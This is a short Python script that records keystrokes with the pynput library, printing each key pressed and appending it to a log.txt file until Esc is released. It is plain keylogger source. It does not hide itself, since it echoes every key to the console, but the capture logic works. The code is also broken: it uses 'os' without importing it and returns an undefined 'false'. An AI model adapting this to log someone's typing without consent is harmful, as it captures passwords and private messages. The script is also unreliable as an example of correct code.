from pynput.keyboard import Key, Listener


def writeFile(key):
	if (not os.path.isfile("log.txt")):
		f = open("log.txt", "w")
		f.write("{}".format(key))
		f.close()
	else: 
		with open("log.txt", "a") as f:
			f.write("\n{}".format(key))

def onPress(key):
	print("You have pressed {}".format(key))
	writeFile(key)


def onRelease(key):
	if key == Key.esc:
		return false

with Listener(on_press = onPress, on_release = onRelease) as l:
	l.join()


